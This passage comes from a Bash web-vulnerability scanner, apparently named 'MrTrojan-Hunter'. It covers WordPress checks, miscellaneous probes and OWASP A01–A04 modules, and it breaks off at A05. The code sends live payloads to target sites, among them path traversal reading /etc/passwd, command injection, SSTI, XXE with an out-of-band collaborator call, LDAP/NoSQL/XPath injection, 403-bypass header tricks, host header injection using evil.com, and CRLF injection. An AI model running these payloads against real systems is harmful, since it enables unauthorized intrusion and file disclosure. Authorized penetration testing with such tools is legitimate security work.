  $RUN_WORDPRES || { log_info "WordPress skipped (--skip-wordpress)"; return 0; }
  log_phase "MrTrojan-Hunter | PHASE 19 — WordPress Security"
  local OUT="$OUTPUT_DIR/20_wordpress"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  if [[ ! -f "$ALIVE" || ! -s "$ALIVE" ]]; then
    log_warn "No alive URLs for WordPress check"
    return 0
  fi

  log_module "Detecting WordPress sites"
  local WP_SITES="$OUT/wp_sites.txt"
  while IFS= read -r url; do
    curl -sk "$url" 2>/dev/null \
      | grep -qiE "wp-content|wp-includes|/wordpress" && echo "$url" >> "$WP_SITES"
  done < "$ALIVE" || true

  if [[ ! -s "$WP_SITES" ]]; then
    log_info "No WordPress sites detected"
    return 0
  fi
  log_ok "WordPress sites: $(wc -l < "$WP_SITES")"

  if tool_ok wpscan; then
    while IFS= read -r url; do
      local safe; safe=$(echo "$url" | sed 's|https*://||;s|/.*||;s|:.*||')
      run_cmd "wpscan → $url" \
        bash -c "wpscan --url '$url' \
          --disable-tls-checks \
          -e at -e ap -e u \
          --enumerate ap \
          --plugins-detection aggressive \
          \
          --force -q \
          -o '$OUT/wpscan_${safe}.txt' 2>/dev/null" || true
    done < "$WP_SITES"
  else log_skip "wpscan"; fi

  log_module "WordPress XML-RPC check"
  while IFS= read -r url; do
    local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${url}/xmlrpc.php" 2>/dev/null || true)
    [[ "$resp" == "200" || "$resp" == "405" ]] && {
      log_warn "XML-RPC enabled: ${url}/xmlrpc.php"
      echo "${url}/xmlrpc.php" >> "$OUT/xmlrpc_enabled.txt"
    }
  done < "$WP_SITES" || true
}

# ─────────────────────────────────────────────
#  PHASE 20 — ADDITIONAL CHECKS
# ─────────────────────────────────────────────
phase_additional() {
  log_phase "MrTrojan-Hunter | PHASE 20 — Additional Checks"
  local OUT_BASE="$OUTPUT_DIR"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  # HTTP security headers
  log_module "HTTP security header analysis"
  [[ -s "$ALIVE" ]] && while IFS= read -r url; do
    local headers; headers=$(curl -sk -I "$url" 2>/dev/null || true)
    local missing=""
    echo "$headers" | grep -qi "Strict-Transport-Security"    || missing+=" HSTS"
    echo "$headers" | grep -qi "X-Frame-Options"              || missing+=" X-Frame-Options"
    echo "$headers" | grep -qi "X-Content-Type-Options"       || missing+=" X-Content-Type-Options"
    echo "$headers" | grep -qi "Content-Security-Policy"      || missing+=" CSP"
    echo "$headers" | grep -qi "Referrer-Policy"              || missing+=" Referrer-Policy"
    echo "$headers" | grep -qi "Permissions-Policy"           || missing+=" Permissions-Policy"
    [[ -n "$missing" ]] && \
      echo "$url | MISSING:$missing" >> "$OUT_BASE/04_webprobe/missing_headers.txt"
  done < "$ALIVE" 2>/dev/null || true
  log_ok "Security headers → $OUT_BASE/04_webprobe/missing_headers.txt"

  # SSL/TLS old version check
  log_module "SSL/TLS version check (TLS <= 1.1)"
  local tls; tls=$(curl -sk --tls-max 1.1 -o /dev/null -w "%{http_code}" \
    "https://$DOMAIN" 2>/dev/null || true)
  [[ "$tls" != "000" ]] && {
    log_warn "Old TLS (<=1.1) accepted: $DOMAIN"
    echo "$DOMAIN accepts TLS 1.0/1.1" >> "$OUT_BASE/04_webprobe/tls_issues.txt"
  }

  # robots.txt / sitemap.xml
  log_module "robots.txt / sitemap.xml harvesting"
  for path in "/robots.txt" "/sitemap.xml" "/sitemap_index.xml" "/.well-known/security.txt"; do
    local content; content=$(curl -sk "https://${DOMAIN}${path}" 2>/dev/null || true)
    [[ -n "$content" ]] && {
      echo "=== https://${DOMAIN}${path} ===" >> "$OUT_BASE/05_crawl/robots_sitemap.txt"
      echo "$content" >> "$OUT_BASE/05_crawl/robots_sitemap.txt"
      [[ "$path" == "/robots.txt" ]] && echo "$content" | \
        grep -iE "^Disallow:" | awk '{print $2}' | \
        awk -v d="https://$DOMAIN" '{print d $1}' >> "$OUT_BASE/05_crawl/robots_disallowed.txt"
    }
  done

  # IDOR candidate detection
  log_module "IDOR-prone URL detection"
  [[ -f "$OUT_BASE/05_crawl/all_urls.txt" ]] && \
    grep -E "/(user|account|profile|order|invoice|ticket|uid|userId)s?/[0-9]+" \
      "$OUT_BASE/05_crawl/all_urls.txt" 2>/dev/null | sort -u > \
      "$OUT_BASE/06_params/idor_candidates.txt" || true

  # Host header injection
  log_module "Host header injection check"
  [[ -s "$ALIVE" ]] && while IFS= read -r url; do
    local resp; resp=$(curl -sk -H "Host: evil.com" "$url" 2>/dev/null \
      | grep -i "evil.com" || true)
    [[ -n "$resp" ]] && {
      log_warn "Possible host header injection: $url"
      echo "$url" >> "$OUT_BASE/16_nuclei/host_header_injection.txt"
    }
  done < <(head -20 "$ALIVE") 2>/dev/null || true

  # CRLF injection
  log_module "CRLF injection quick check"
  if tool_ok qsreplace && [[ -s "$OUT_BASE/06_params/param_urls.txt" ]]; then
    cat "$OUT_BASE/06_params/param_urls.txt" | head -30 | \
      qsreplace $'%0d%0aSet-Cookie:crlf=1' 2>/dev/null | \
      xargs -I% -P 10 sh -c \
        'curl -sk -I "%" 2>/dev/null | grep -qi "Set-Cookie: crlf" && echo "CRLF: %"' \
      >> "$OUT_BASE/16_nuclei/crlf_candidates.txt" 2>/dev/null || true
  fi

  # HTTP smuggling (nuclei, deep only)
  if $DEEP_SCAN && tool_ok nuclei && [[ -s "$ALIVE" ]]; then
    run_cmd "nuclei HTTP smuggling templates" \
      bash -c "nuclei -l '$ALIVE' \
        -t '${NUCLEI_TEMPLATES}/http/vulnerabilities/' \
        -tags smuggling -c 10 -silent \
        -o '$OUT_BASE/16_nuclei/http_smuggling.txt' 2>/dev/null"
  fi

  # GraphQL endpoint detection
  log_module "GraphQL endpoint detection"
  local GRAPHQL_PATHS=("/graphql" "/api/graphql" "/v1/graphql" "/gql" "/query" "/graphiql" "/playground")
  [[ -s "$ALIVE" ]] && while IFS= read -r url; do
    for gpath in "${GRAPHQL_PATHS[@]}"; do
      local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "${url}${gpath}" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}' 2>/dev/null || true)
      [[ "$resp" == "200" ]] && {
        log_ok "GraphQL found: ${url}${gpath}"
        echo "${url}${gpath}" >> "$OUT_BASE/16_nuclei/graphql_endpoints.txt"
      }
    done
  done < <(head -20 "$ALIVE") 2>/dev/null || true

  # API versioning exposure
  log_module "API version endpoint scan"
  [[ -s "$ALIVE" ]] && for v in v1 v2 v3 api rest; do
    while IFS= read -r url; do
      local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" \
        "${url}/${v}/" 2>/dev/null || true)
      [[ "$resp" =~ ^(200|201|401|403)$ ]] && \
        echo "[${resp}] ${url}/${v}/" >> "$OUT_BASE/16_nuclei/api_versions.txt"
    done < <(head -20 "$ALIVE") 2>/dev/null || true
  done

  # 403 bypass
  log_module "403 bypass attempts"
  [[ -s "$OUT_BASE/04_webprobe/alive_full.txt" ]] && \
  while IFS= read -r line; do
    local url; url=$(echo "$line" | awk '{print $1}')
    local code; code=$(echo "$line" | grep -oP '\[\K[0-9]+(?=\])' | head -1 || true)
    if [[ "$code" == "403" ]]; then
      local bypass_headers=(
        "X-Original-URL: $url" "X-Rewrite-URL: $url"
        "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
      )
      for hdr in "${bypass_headers[@]}"; do
        local resp; resp=$(curl -sk -o /dev/null -w "%{http_code}" -H "$hdr" "$url" 2>/dev/null || true)
        [[ "$resp" == "200" ]] && {
          log_warn "403 bypass: $url (Header: $hdr)"
          echo "$url | $hdr" >> "$OUT_BASE/16_nuclei/403_bypasses.txt"
        }
      done
    fi
  done < "$OUT_BASE/04_webprobe/alive_full.txt" 2>/dev/null || true

  # Flag interesting ports
  log_module "Flagging interesting open ports"
  [[ -s "$OUTPUT_DIR/03_portscan/naabu_top1000.txt" ]] && \
    grep -E ":(21|22|23|25|53|110|143|389|445|1433|1521|2375|2376|3306|3389|4848|5432|5900|6379|7001|8161|9200|27017)$" \
      "$OUTPUT_DIR/03_portscan/naabu_top1000.txt" 2>/dev/null \
      | sort -u > "$OUTPUT_DIR/03_portscan/interesting_ports.txt" || true
  log_ok "Additional checks complete"
}


# ═══════════════════════════════════════════════════════════════════════════
#  OWASP TOP 10 — 2021 FULL COVERAGE
#  A01 Broken Access Control
#  A02 Cryptographic Failures
#  A03 Injection (SQLi, CMDi, SSTi, XXE, LDAPi, XPATHi, NOSQLi)
#  A04 Insecure Design
#  A05 Security Misconfiguration
#  A06 Vulnerable & Outdated Components
#  A07 Identification & Authentication Failures
#  A08 Software & Data Integrity Failures
#  A09 Security Logging & Monitoring Failures
#  A10 SSRF (extended)
# ═══════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────
#  OWASP A01 — BROKEN ACCESS CONTROL
# ─────────────────────────────────────────────
owasp_a01_access_control() {
  log_phase "MrTrojan-Hunter | OWASP A01 — Broken Access Control"
  local OUT="$OUTPUT_DIR/owasp_a01_access_control"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  [[ ! -s "$ALIVE" ]] && { log_warn "No alive URLs — skipping A01"; return 0; }

  # ── IDOR numeric ID enumeration ───────────────────────────────────────────
  log_module "IDOR — numeric ID enumeration"
  if [[ -s "$URLS" ]]; then
    grep -E "/(user|account|profile|order|invoice|ticket|id|uid|userId|doc|file|item)s?/[0-9]+" \
      "$URLS" 2>/dev/null | sort -u > "$OUT/idor_candidates.txt" || true

    while IFS= read -r url; do
      local base="${url%/*}"
      local orig_id="${url##*/}"
      for test_id in 1 2 3 100 1000 9999; do
        [[ "$test_id" == "$orig_id" ]] && continue
        local test_url="${base}/${test_id}"
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null || true)
        [[ "$code" == "200" ]] && {
          log_vuln "IDOR candidate [200]: $test_url (original ID: $orig_id)"
          echo "[IDOR] $test_url" >> "$OUT/idor_hits.txt"
        }
      done
    done < <(head -30 "$OUT/idor_candidates.txt" 2>/dev/null) || true
  fi

  # ── Horizontal privilege escalation — param manipulation ──────────────────
  log_module "Horizontal privilege escalation (param manipulation)"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"
  if tool_ok qsreplace && [[ -s "$PARAM_URLS" ]]; then
    grep -iE "user_id=|account=|uid=|member=|profile=" "$PARAM_URLS" 2>/dev/null \
      | head -30 \
      | while IFS= read -r url; do
          local fuzzed; fuzzed=$(echo "$url" | qsreplace "1" 2>/dev/null || true)
          local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$fuzzed" 2>/dev/null || true)
          [[ "$code" == "200" ]] && echo "[PRIV-ESC] $fuzzed" >> "$OUT/priv_escalation.txt"
        done || true
  fi

  # ── 403/401 bypass techniques ─────────────────────────────────────────────
  log_module "403/401 bypass — header & path tricks"
  if [[ -s "$ALIVE" ]]; then
    local BYPASS_PATHS=("/admin" "/admin/" "/admin/." "//admin//" "/./admin/."
      "/admin%20" "/admin%09" "/admin%00" "/%2fadmin" "/admin/.."
      "/admin;/" "/admin..;/" "/.;/admin")
    local BYPASS_HEADERS=(
      "X-Original-URL"
      "X-Rewrite-URL"
      "X-Custom-IP-Authorization: 127.0.0.1"
      "X-Forwarded-For: 127.0.0.1"
      "X-Forwarded-Host: localhost"
      "X-Host: 127.0.0.1"
      "X-Real-IP: 127.0.0.1"
      "X-Remote-IP: 127.0.0.1"
      "X-Remote-Addr: 127.0.0.1"
      "X-ProxyUser-Ip: 127.0.0.1"
      "X-Original-Remote-Addr: 127.0.0.1"
      "Client-IP: 127.0.0.1"
      "True-Client-IP: 127.0.0.1"
      "Cluster-Client-IP: 127.0.0.1"
    )

    while IFS= read -r url; do
      # path tricks
      for path in "${BYPASS_PATHS[@]}"; do
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
        [[ "$code" == "200" ]] && {
          log_vuln "403 Bypass via path [${url}${path}]"
          echo "[PATH-BYPASS 200] ${url}${path}" >> "$OUT/403_bypass.txt"
        }
      done
      # header tricks against known 403 pages
      local base_code; base_code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}/admin" 2>/dev/null || true)
      if [[ "$base_code" == "403" || "$base_code" == "401" ]]; then
        for hdr in "${BYPASS_HEADERS[@]}"; do
          local code; code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$hdr" "${url}/admin" 2>/dev/null || true)
          [[ "$code" == "200" ]] && {
            log_vuln "403 Bypass via header [$hdr] on ${url}/admin"
            echo "[HDR-BYPASS] ${url}/admin | $hdr" >> "$OUT/403_bypass.txt"
          }
        done
      fi
    done < <(head -20 "$ALIVE") || true
  fi

  # ── Directory traversal ────────────────────────────────────────────────────
  log_module "Directory traversal"
  local TRAV_PAYLOADS=(
    "../../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "..%252F..%252Fetc%252Fpasswd"
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%c0%af..%c0%afetc/passwd"
    "/etc/passwd%00"
  )
  if tool_ok qsreplace && [[ -s "$PARAM_URLS" ]]; then
    for payload in "${TRAV_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" 2>/dev/null \
        | grep -iE "file=|path=|dir=|folder=|doc=|page=|include=" \
        | head -20 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r turl; do
            local resp; resp=$(curl -sk "$turl" 2>/dev/null | head -5 || true)
            echo "$resp" | grep -q "root:x" && {
              log_vuln "Directory Traversal: $turl"
              echo "$turl" >> "$OUT/dir_traversal.txt"
            }
          done || true
    done
  fi

  # ── Mass assignment / param pollution ─────────────────────────────────────
  log_module "HTTP parameter pollution"
  if [[ -s "$PARAM_URLS" ]]; then
    head -20 "$PARAM_URLS" 2>/dev/null \
      | while IFS= read -r url; do
          local param; param=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -1 || true)
          [[ -z "$param" ]] && continue
          local polluted="${url}&${param}=POLLUTED&admin=true&role=admin&isAdmin=1"
          local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$polluted" 2>/dev/null || true)
          [[ "$code" == "200" ]] && echo "[PARAM-POLLUTION] $polluted" >> "$OUT/param_pollution.txt"
        done || true
  fi

  # ── nuclei IDOR / access-control templates ────────────────────────────────
  if tool_ok nuclei && [[ -s "$ALIVE" ]]; then
    run_cmd "nuclei access-control templates" \
      bash -c "nuclei -l '$ALIVE' \
        -tags idor,auth-bypass,traversal,exposure \
        -severity medium,high,critical -c 30 -silent \
        -o '$OUT/nuclei_access_control.txt' 2>/dev/null"
  fi

  log_ok "A01 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A02 — CRYPTOGRAPHIC FAILURES
# ─────────────────────────────────────────────
owasp_a02_crypto() {
  log_phase "MrTrojan-Hunter | OWASP A02 — Cryptographic Failures"
  local OUT="$OUTPUT_DIR/owasp_a02_crypto"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"

  # ── TLS version & cipher check ────────────────────────────────────────────
  log_module "TLS version check (SSLv3, TLS 1.0, TLS 1.1)"
  for tls_ver in "ssl3" "tls1" "tls1_1"; do
    local code; code=$(curl -sk --"$tls_ver" -o /dev/null -w "%{http_code}" \
      "https://$DOMAIN" 2>/dev/null || true)
    [[ "$code" != "000" && -n "$code" ]] && {
      log_vuln "Weak TLS accepted ($tls_ver): $DOMAIN"
      echo "$DOMAIN accepts $tls_ver" >> "$OUT/weak_tls.txt"
    }
  done

  # ── Certificate checks ────────────────────────────────────────────────────
  log_module "Certificate expiry & self-signed check"
  local cert_info; cert_info=$(echo | openssl s_client -connect "${DOMAIN}:443" \
    -servername "$DOMAIN" 2>/dev/null | openssl x509 -noout -dates -issuer -subject 2>/dev/null || true)
  echo "$cert_info" > "$OUT/cert_info.txt"
  echo "$cert_info" | grep -q "notAfter" && {
    local expiry; expiry=$(echo "$cert_info" | grep "notAfter" | cut -d= -f2)
    log_info "Certificate expires: $expiry"
    local exp_epoch; exp_epoch=$(date -d "$expiry" +%s 2>/dev/null || true)
    local now_epoch; now_epoch=$(date +%s)
    local days_left=$(( (exp_epoch - now_epoch) / 86400 ))
    [[ $days_left -lt 30 ]] && {
      log_vuln "Certificate expires in $days_left days!"
      echo "Cert expires in $days_left days: $DOMAIN" >> "$OUT/cert_expiry.txt"
    }
  }

  # ── Mixed content (HTTP resources on HTTPS pages) ─────────────────────────
  log_module "Mixed content detection (HTTP on HTTPS)"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      [[ "$url" != https://* ]] && continue
      curl -sk "$url" 2>/dev/null \
        | grep -iE 'src="http://|href="http://|action="http://' \
        | grep -v "http://www.w3.org\|http://www.facebook.com\|http://schema.org" \
        >> "$OUT/mixed_content.txt" || true
    done < <(head -20 "$ALIVE") || true
  fi

  # ── HTTP (non-HTTPS) endpoints ────────────────────────────────────────────
  log_module "Plain HTTP endpoints (no HTTPS redirect)"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      [[ "$url" != http://* ]] && continue
      local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || true)
      [[ "$code" == "200" ]] && {
        log_warn "Plain HTTP live: $url"
        echo "$url" >> "$OUT/plain_http.txt"
      }
    done < "$ALIVE" || true
  fi

  # ── Sensitive data in URL parameters ──────────────────────────────────────
  log_module "Sensitive data in URLs (passwords, tokens, keys)"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"
  if [[ -s "$URLS" ]]; then
    grep -iE "[?&](password|passwd|pass|pwd|token|api_key|apikey|secret|auth|session|access_key)=" \
      "$URLS" 2>/dev/null | sort -u > "$OUT/sensitive_params_in_url.txt" || true
    [[ -s "$OUT/sensitive_params_in_url.txt" ]] && \
      log_vuln "Sensitive params in URLs → $OUT/sensitive_params_in_url.txt"
  fi

  # ── Cookie flags ──────────────────────────────────────────────────────────
  log_module "Cookie security flags (Secure, HttpOnly, SameSite)"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      local headers; headers=$(curl -sk -I "$url" 2>/dev/null || true)
      echo "$headers" | grep -i "set-cookie" | while IFS= read -r cookie_line; do
        local issues=""
        echo "$cookie_line" | grep -qi "secure"   || issues+=" MISSING:Secure"
        echo "$cookie_line" | grep -qi "httponly" || issues+=" MISSING:HttpOnly"
        echo "$cookie_line" | grep -qi "samesite" || issues+=" MISSING:SameSite"
        [[ -n "$issues" ]] && echo "$url |$issues | $cookie_line" >> "$OUT/cookie_flags.txt"
      done || true
    done < <(head -20 "$ALIVE") || true
  fi

  # ── nuclei crypto/ssl templates ───────────────────────────────────────────
  if tool_ok nuclei && [[ -s "$ALIVE" ]]; then
    run_cmd "nuclei SSL/TLS templates" \
      bash -c "nuclei -l '$ALIVE' \
        -tags ssl,tls,crypto -c 30 -silent \
        -o '$OUT/nuclei_crypto.txt' 2>/dev/null"
  fi

  log_ok "A02 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A03 — INJECTION (extended)
# ─────────────────────────────────────────────
owasp_a03_injection() {
  log_phase "MrTrojan-Hunter | OWASP A03 — Injection (CMDi, SSTi, XXE, LDAPi, NOSQLi, XPATHi)"
  local OUT="$OUTPUT_DIR/owasp_a03_injection"
  mkdir -p "$OUT"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"
  [[ ! -s "$PARAM_URLS" ]] && { log_warn "No param URLs — skipping A03 extended injection"; return 0; }

  # ── Command Injection ─────────────────────────────────────────────────────
  log_module "OS Command Injection"
  local CMDI_PAYLOADS=(
    ';id'  '|id'  '\`id\`'  '$(id)'
    ';sleep+5'  '|sleep+5'  '&&sleep+5'
    ';ping+-c+1+127.0.0.1'
    '%3Bid'  '%7Cid'  '%0Aid'
  )
  if tool_ok qsreplace; then
    for payload in "${CMDI_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" | head -30 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | head -10 || true)
            echo "$resp" | grep -qE "uid=[0-9]+|root|www-data" && {
              log_vuln "CMDi confirmed: $url"
              echo "[CMDi] $url" >> "$OUT/cmdi_confirmed.txt"
            }
          done || true
    done
  fi

  # ── Server-Side Template Injection ────────────────────────────────────────
  log_module "Server-Side Template Injection (SSTi)"
  local SSTI_PAYLOADS=(
    '{{7*7}}'       # Jinja2/Twig → 49
    '${7*7}'        # FreeMarker/Thymeleaf → 49
    '<%= 7*7 %>'    # ERB → 49
    '#{7*7}'        # Ruby
    '*{7*7}'        # Spring SpEL → 49
    '{{7*"7"}}'     # Jinja2 → 7777777
    '${{7*7}}'      # Pebble
    '@(7*7)'        # Razor
  )
  if tool_ok qsreplace; then
    for payload in "${SSTI_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" | head -30 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | grep -oE '[0-9]+' | head -5 || true)
            echo "$resp" | grep -qE "^49$|^7777777$" && {
              log_vuln "SSTi confirmed (math eval): $url [payload: $payload]"
              echo "[SSTi] $url | $payload" >> "$OUT/ssti_confirmed.txt"
            }
          done || true
    done
  fi

  if tool_ok nuclei; then
    run_cmd "nuclei SSTi templates" \
      bash -c "nuclei -l '$PARAM_URLS' \
        -tags ssti -c 30 -silent \
        -o '$OUT/nuclei_ssti.txt' 2>/dev/null"
  fi

  # ── XXE — XML External Entity ─────────────────────────────────────────────
  log_module "XXE — XML External Entity Injection"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  local XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
  local XXE_OOB_PAYLOAD=""
  [[ -n "$BURP_COLLABORATOR" ]] && \
    XXE_OOB_PAYLOAD="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://${BURP_COLLABORATOR}/xxe\">]><foo>&xxe;</foo>"

  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      # POST XML to each live endpoint
      local resp; resp=$(curl -sk -X POST "$url" \
        -H "Content-Type: application/xml" \
        -d "$XXE_PAYLOAD" 2>/dev/null | head -10 || true)
      echo "$resp" | grep -q "root:x" && {
        log_vuln "XXE confirmed (file read): $url"
        echo "[XXE] $url" >> "$OUT/xxe_confirmed.txt"
      }
      # OOB XXE if collaborator set
      if [[ -n "$XXE_OOB_PAYLOAD" ]]; then
        curl -sk -X POST "$url" \
          -H "Content-Type: application/xml" \
          -d "$XXE_OOB_PAYLOAD" -o /dev/null 2>/dev/null || true
      fi
    done < <(head -20 "$ALIVE") || true
  fi

  if tool_ok nuclei; then
    run_cmd "nuclei XXE templates" \
      bash -c "nuclei -l '${ALIVE:-/dev/null}' \
        -tags xxe -c 30 -silent \
        -o '$OUT/nuclei_xxe.txt' 2>/dev/null"
  fi

  # ── LDAP Injection ────────────────────────────────────────────────────────
  log_module "LDAP Injection"
  local LDAP_PAYLOADS=('*' '*)(uid=*' 'admin)(&)' '*)(|(password=*' '*(|(objectclass=*')
  if tool_ok qsreplace; then
    for payload in "${LDAP_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" | head -20 \
        | grep -iE "user=|username=|login=|search=|q=" \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | head -5 || true)
            echo "$resp" | grep -iqE "ldap|invalid dn|ldap_bind" && {
              log_vuln "LDAP Injection error: $url"
              echo "[LDAP] $url" >> "$OUT/ldap_injection.txt"
            }
          done || true
    done
  fi

  # ── NoSQL Injection ───────────────────────────────────────────────────────
  log_module "NoSQL Injection (MongoDB)"
  local NOSQL_PAYLOADS=(
    '{"$gt":""}' '{"$ne":""}' '{"$where":"1==1"}'
    '{"$regex":".*"}' '{"$exists":true}'
    "' || '1'=='1" "' || 1==1//" "admin' || 'a'='a"
  )
  if tool_ok qsreplace; then
    for payload in "${NOSQL_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" | head -20 \
        | grep -iE "user=|username=|email=|login=|search=" \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || true)
            [[ "$code" == "200" ]] && {
              log_warn "Potential NoSQL Injection: $url"
              echo "[NOSQL] $url" >> "$OUT/nosql_injection.txt"
            }
          done || true
    done
  fi

  # ── XPath Injection ───────────────────────────────────────────────────────
  log_module "XPath Injection"
  local XPATH_PAYLOADS=("' or '1'='1" "' or 1=1 or 'a'='a" "'] | //user/*[contains(*,'")
  if tool_ok qsreplace; then
    for payload in "${XPATH_PAYLOADS[@]}"; do
      cat "$PARAM_URLS" | head -15 \
        | qsreplace "$payload" 2>/dev/null \
        | while IFS= read -r url; do
            local resp; resp=$(curl -sk "$url" 2>/dev/null | head -5 || true)
            echo "$resp" | grep -iqE "xpath|xmldb|xquery|invalid expression" && {
              log_vuln "XPath Injection: $url"
              echo "[XPATH] $url" >> "$OUT/xpath_injection.txt"
            }
          done || true
    done
  fi

  # ── nuclei injection templates ────────────────────────────────────────────
  if tool_ok nuclei; then
    run_cmd "nuclei injection templates (CMDi/SSTi/XXE/NoSQL)" \
      bash -c "nuclei -l '$PARAM_URLS' \
        -tags injection,rce,cmdi,ssti,xxe -c 30 -silent \
        -o '$OUT/nuclei_injection.txt' 2>/dev/null"
  fi

  log_ok "A03 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A04 — INSECURE DESIGN
# ─────────────────────────────────────────────
owasp_a04_insecure_design() {
  log_phase "MrTrojan-Hunter | OWASP A04 — Insecure Design"
  local OUT="$OUTPUT_DIR/owasp_a04_insecure_design"
  mkdir -p "$OUT"
  local ALIVE="$OUTPUT_DIR/04_webprobe/alive_urls.txt"
  local URLS="$OUTPUT_DIR/05_crawl/all_urls.txt"

  # ── Password reset flaws ───────────────────────────────────────────────────
  log_module "Password reset endpoint discovery"
  if [[ -s "$ALIVE" ]]; then
    local RESET_PATHS=("/forgot-password" "/reset-password" "/password-reset"
      "/account/recover" "/user/forgot" "/auth/reset"
      "/api/password/reset" "/api/forgot" "/api/v1/password-reset")
    while IFS= read -r url; do
      for path in "${RESET_PATHS[@]}"; do
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
        [[ "$code" =~ ^(200|301|302|405)$ ]] && \
          echo "[${code}] ${url}${path}" >> "$OUT/reset_endpoints.txt"
      done
    done < <(head -10 "$ALIVE") || true
    [[ -s "$OUT/reset_endpoints.txt" ]] && log_info "Reset endpoints → $OUT/reset_endpoints.txt"
  fi

  # ── Rate limit on sensitive endpoints ─────────────────────────────────────
  log_module "Rate limit check (10 rapid requests)"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      local hit_count=0
      for i in $(seq 1 10); do
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}/login" 2>/dev/null || true)
        [[ "$code" == "200" ]] && (( hit_count++ )) || true
      done
      [[ $hit_count -eq 10 ]] && {
        log_warn "No rate limit detected on ${url}/login (10/10 requests succeeded)"
        echo "${url}/login" >> "$OUT/no_rate_limit.txt"
      }
    done < <(head -5 "$ALIVE") || true
  fi

  # ── Business logic — negative values / boundary testing ───────────────────
  log_module "Business logic — negative & boundary param values"
  local PARAM_URLS="$OUTPUT_DIR/06_params/param_urls.txt"
  if tool_ok qsreplace && [[ -s "$PARAM_URLS" ]]; then
    for val in "-1" "0" "99999999" "-99999" "null" "undefined" "NaN"; do
      grep -iE "qty=|quantity=|amount=|price=|count=|num=" "$PARAM_URLS" 2>/dev/null \
        | head -10 \
        | qsreplace "$val" 2>/dev/null \
        | while IFS= read -r url; do
            local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || true)
            [[ "$code" == "200" ]] && echo "[LOGIC] $url | val=$val" >> "$OUT/logic_flaws.txt"
          done || true
    done
  fi

  # ── Debug / admin endpoints ────────────────────────────────────────────────
  log_module "Debug / admin endpoint exposure"
  local DEBUG_PATHS=("/debug" "/test" "/staging" "/dev" "/internal"
    "/admin" "/administrator" "/manage" "/management" "/console"
    "/actuator" "/actuator/env" "/actuator/health" "/actuator/info"
    "/actuator/mappings" "/actuator/beans" "/actuator/dump"
    "/.well-known/acme-challenge/" "/server-status" "/server-info"
    "/_ah/admin" "/_ah/api/explorer")
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r url; do
      for path in "${DEBUG_PATHS[@]}"; do
        local code; code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null || true)
        [[ "$code" =~ ^(200|301|302)$ ]] && {
          log_warn "Debug/admin endpoint [${code}]: ${url}${path}"
          echo "[${code}] ${url}${path}" >> "$OUT/debug_endpoints.txt"
        }
      done
    done < <(head -10 "$ALIVE") || true
  fi

  log_ok "A04 complete → $OUT/"
}

# ─────────────────────────────────────────────
#  OWASP A05 — SECURITY MISCONFIGURATION
# ─────────────────────────────────────────────
owasp_a05_misconfig() {
  log_phase "MrTrojan-Hunter | OWASP A05 — Security Misconfiguration"
  local OUT="$OUTPUT_DIR/owasp_a05_misconfig"
  mkdir -p "$OUT"
